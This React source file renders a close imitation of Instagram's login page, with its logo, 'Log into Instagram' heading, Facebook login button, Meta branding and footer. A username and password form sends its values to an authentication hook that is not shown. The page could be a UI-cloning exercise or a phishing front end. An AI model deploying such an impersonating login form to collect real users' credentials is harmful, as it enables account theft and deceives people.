import { useState, FormEvent } from "react";
import { useAuth } from "../hooks/useAuth";
import PhoneMockup from "../components/PhoneMockup";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const { login, loading, error } = useAuth();

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!username || !password) return;
    await login({ username, password });
  };

  const isFormValid = username.length > 0 && password.length >= 6;

  const footerLinks = [
    "Meta",
    "About",
    "Blog",
    "Jobs",
    "Help",
    "API",
    "Privacy",
    "Terms",
    "Locations",
    "Popular",
    "Instagram Lite",
    "Meta AI",
    "Threads",
    "Contact Uploading & Non-Users",
    "Meta Verified",
  ];

  return (
    <div
      style={{
        fontFamily:
          '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
        fontSize: "14px",
        lineHeight: "18px",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        backgroundColor: "#ffffff",
      }}
    >
      {/* Main Content */}
      <div
        style={{
          flex: 1,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          padding: "0 16px",
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "0",
            maxWidth: "1200px",
            width: "100%",
          }}
        >
          {/* LEFT SIDE — hidden on mobile */}
          <div
            style={{
              flex: 1,
              display: "flex",
              flexDirection: "column",
              alignItems: "flex-start",
              justifyContent: "center",
              minWidth: "550px",
            }}
            className="hidden md:flex"
          >
            {/* Instagram Gradient Logo */}
            <div style={{ marginBottom: "24px" }}>
              <svg width="72" height="72" viewBox="0 0 24 24" fill="none">
                <rect
                  x="2"
                  y="2"
                  width="20"
                  height="20"
                  rx="5"
                  stroke="url(#insta-gradient)"
                  strokeWidth="1.5"
                />
                <circle
                  cx="12"
                  cy="12"
                  r="4.5"
                  stroke="url(#insta-gradient)"
                  strokeWidth="1.5"
                />
                <circle cx="17.5" cy="6.5" r="1" fill="url(#insta-gradient)" />
                <defs>
                  <linearGradient
                    id="insta-gradient"
                    x1="2"
                    y1="2"
                    x2="22"
                    y2="22"
                  >
                    <stop offset="0%" stopColor="#f09433" />
                    <stop offset="25%" stopColor="#e6683c" />
                    <stop offset="50%" stopColor="#dc2743" />
                    <stop offset="75%" stopColor="#cc2366" />
                    <stop offset="100%" stopColor="#bc1888" />
                  </linearGradient>
                </defs>
              </svg>
            </div>

            {/* Heading */}
            <div style={{ marginBottom: "16px", width: "100%" }}>
              <h1
                style={{
                  fontSize: "35.308px",
                  lineHeight: "64.8px",
                  fontWeight: 400,
                  color: "rgb(17, 17, 18)",
                  margin: 0,
                  wordBreak: "break-word",
                  whiteSpace: "normal",
                }}
              >
                See everyday moments from your
              </h1>
              <h2
                style={{
                  fontSize: "35.308px",
                  lineHeight: "64.8px",
                  fontWeight: 400,
                  margin: 0,
                  wordBreak: "break-word",
                  whiteSpace: "normal",
                  background:
                    "linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888)",
                  WebkitBackgroundClip: "text",
                  WebkitTextFillColor: "transparent",
                  backgroundClip: "text",
                }}
              >
                close friends.
              </h2>
            </div>

            {/* Photo Collage Container */}
            <div
              style={{
                width: "500px",
                minHeight: "290px",
                position: "relative",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <PhoneMockup />
            </div>
          </div>

          {/* VERTICAL DIVIDER — hidden on mobile */}
          <div
            className="hidden md:block"
            style={{
              width: "1px",
              height: "640px",
              backgroundColor: "#DBDBDB",
              margin: "0 32px",
              flexShrink: 0,
            }}
          />

          {/* RIGHT SIDE — full width on mobile */}
          <div
            style={{
              width: "100%",
              maxWidth: "592.1px",
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              justifyContent: "center",
              flexShrink: 0,
              padding: "0 16px",
            }}
          >
            <h1
              style={{
                textAlign: "start",
                fontSize: "17px",
                fontWeight: 600,
                color: "rgb(17, 17, 18)",
                marginBottom: "24px",
                fontFamily:
                  'Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif',
                lineHeight: "21.9997px",
                width: "100%",
                maxWidth: "488.1px",
                wordBreak: "break-word",
              }}
            >
              Log into Instagram
            </h1>

            <form
              onSubmit={handleSubmit}
              autoComplete="off"
              style={{
                display: "flex",
                flexDirection: "column",
                gap: "8px",
                width: "100%",
                maxWidth: "488.1px",
                alignItems: "center",
              }}
            >
              {/* Email Input */}
              <div
                style={{
                  width: "100%",
                  height: "60px",
                  minHeight: "60px",
                  padding: "10px 16px",
                  backgroundColor: "rgba(255, 255, 255, 0.2)",
                  border: "0.8px solid #D0D3D6",
                  borderRadius: "16px",
                  boxSizing: "border-box",
                  display: "flex",
                  flexDirection: "column",
                  justifyContent: "center",
                  position: "relative",
                  overflow: "hidden",
                }}
              >
                <input
                  type="text"
                  name="username"
                  autoComplete="off"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Mobile number, username or email"
                  style={{
                    width: "100%",
                    height: "38px",
                    padding: "1px 2px",
                    margin: "0 -2px",
                    fontSize: "15px",
                    fontWeight: 500,
                    lineHeight: "19px",
                    color: "#111112",
                    backgroundColor: "transparent",
                    border: "none",
                    outline: "none",
                    fontFamily: "inherit",
                    textOverflow: "ellipsis",
                    overflow: "hidden",
                    whiteSpace: "nowrap",
                    minWidth: 0,
                  }}
                />
              </div>

              {/* Password Input */}
              <div
                style={{
                  width: "100%",
                  height: "60px",
                  minHeight: "60px",
                  padding: "10px 16px",
                  backgroundColor: "rgba(255, 255, 255, 0.2)",
                  border: "0.8px solid #D0D3D6",
                  borderRadius: "16px",
                  boxSizing: "border-box",
                  display: "flex",
                  flexDirection: "column",
                  justifyContent: "center",
                  position: "relative",
                  overflow: "hidden",
                }}
              >
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  autoComplete="new-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  style={{
                    width: "100%",
                    height: "38px",
                    padding: "1px 2px",
                    paddingRight: "50px",
                    margin: "0 -2px",
                    fontSize: "15px",
                    fontWeight: 500,
                    lineHeight: "19px",
                    color: "#111112",
                    backgroundColor: "transparent",
                    border: "none",
                    outline: "none",
                    fontFamily: "inherit",
                    textOverflow: "ellipsis",
                    overflow: "hidden",
                    whiteSpace: "nowrap",
                    minWidth: 0,
                  }}
                />
                {password.length > 0 && (
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    style={{
                      position: "absolute",
                      right: "16px",
                      top: "50%",
                      transform: "translateY(-50%)",
                      fontSize: "14px",
                      fontWeight: 600,
                      color: "#262626",
                      background: "none",
                      border: "none",
                      cursor: "pointer",
                      fontFamily: "inherit",
                    }}
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                )}
              </div>

              {error && (
                <p
                  style={{
                    fontSize: "12px",
                    color: "#ef4444",
                    textAlign: "center",
                    margin: 0,
                  }}
                >
                  {error}
                </p>
              )}

              <button
                type="submit"
                disabled={!isFormValid || loading}
                style={{
                  width: "100%",
                  padding: "8px 0",
                  borderRadius: "8px",
                  fontSize: "14px",
                  fontWeight: 600,
                  color: "#ffffff",
                  backgroundColor:
                    isFormValid && !loading
                      ? "#0095F6"
                      : "rgba(0, 149, 246, 0.3)",
                  cursor: isFormValid && !loading ? "pointer" : "default",
                  border: "none",
                  fontFamily: "inherit",
                  marginTop: "4px",
                  height: "36px",
                }}
              >
                {loading ? "Logging in..." : "Log in"}
              </button>
            </form>

            {/* Forgot password */}
            <div
              style={{
                textAlign: "center",
                marginTop: "12px",
                width: "100%",
                maxWidth: "488.1px",
              }}
            >
              <a
                href="#"
                style={{
                  fontSize: "14px",
                  color: "#00376B",
                  fontWeight: 500,
                  textDecoration: "none",
                }}
              >
                Forgot password?
              </a>
            </div>

            {/* Divider */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                width: "100%",
                maxWidth: "488.1px",
                margin: "16px 0",
              }}
            >
              <div
                style={{ flex: 1, height: "1px", backgroundColor: "#DBDBDB" }}
              />
              <span
                style={{
                  padding: "0 16px",
                  fontSize: "13px",
                  fontWeight: 600,
                  color: "#8E8E8E",
                }}
              >
                OR
              </span>
              <div
                style={{ flex: 1, height: "1px", backgroundColor: "#DBDBDB" }}
              />
            </div>

            {/* Log in with Facebook */}
            <button
              type="button"
              style={{
                width: "100%",
                maxWidth: "488.1px",
                height: "44px",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                flexShrink: 0,
                backgroundColor: "transparent",
                border: "0.8px solid #D0D3D6",
                borderRadius: "22px",
                color: "#4150F7",
                fontSize: "14px",
                fontWeight: 600,
                cursor: "pointer",
                fontFamily: "inherit",
                padding: "0 20px",
                position: "relative",
                userSelect: "none",
                gap: "8px",
              }}
            >
              <svg
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
              </svg>
              Log in with Facebook
            </button>

            {/* Create new account */}
            <button
              type="button"
              style={{
                width: "100%",
                maxWidth: "488.1px",
                height: "44px",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                flexShrink: 0,
                backgroundColor: "rgba(255, 255, 255, 0.2)",
                border: "0.8px solid #D0D3D6",
                borderRadius: "22px",
                color: "#4150F7",
                fontSize: "14px",
                fontWeight: 600,
                cursor: "pointer",
                fontFamily: "inherit",
                padding: "0 16px",
                position: "relative",
                userSelect: "none",
                marginTop: "8px",
              }}
            >
              Create new account
            </button>

            {/* Meta Logo */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginTop: "24px",
              }}
            >
              <svg width="60" height="12" viewBox="0 0 60 12" fill="none">
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M28.5 0C26.5 0 24.7 1.2 23.7 3C22.7 1.2 20.9 0 18.9 0C15.9 0 13.5 2.4 13.5 5.4C13.5 8.4 15.9 10.8 18.9 10.8C20.9 10.8 22.7 9.6 23.7 7.8C24.7 9.6 26.5 10.8 28.5 10.8C31.5 10.8 33.9 8.4 33.9 5.4C33.9 2.4 31.5 0 28.5 0ZM18.9 8.8C17 8.8 15.5 7.3 15.5 5.4C15.5 3.5 17 2 18.9 2C20.8 2 22.3 3.5 22.3 5.4C22.3 7.3 20.8 8.8 18.9 8.8ZM28.5 8.8C26.6 8.8 25.1 7.3 25.1 5.4C25.1 3.5 26.6 2 28.5 2C30.4 2 31.9 3.5 31.9 5.4C31.9 7.3 30.4 8.8 28.5 8.8Z"
                  fill="#0081FB"
                />
                <text
                  x="36"
                  y="9.5"
                  fontFamily="Arial, sans-serif"
                  fontSize="10"
                  fontWeight="bold"
                  fill="#0081FB"
                >
                  Meta
                </text>
              </svg>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer
        style={{
          borderTop: "1px solid #DBDBDB",
          padding: "16px",
          flexShrink: 0,
        }}
      >
        <div style={{ maxWidth: "1152px", margin: "0 auto" }}>
          <div
            style={{
              display: "flex",
              flexWrap: "wrap",
              justifyContent: "center",
              gap: "8px 16px",
              marginBottom: "12px",
            }}
          >
            {footerLinks.map((link) => (
              <a
                key={link}
                href="#"
                style={{
                  fontSize: "12px",
                  color: "#8E8E8E",
                  textDecoration: "none",
                }}
              >
                {link}
              </a>
            ))}
          </div>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "16px",
              fontSize: "12px",
              color: "#8E8E8E",
            }}
          >
            <span>English &#9660;</span>
            <span>&#169; 2026 Instagram from Meta</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
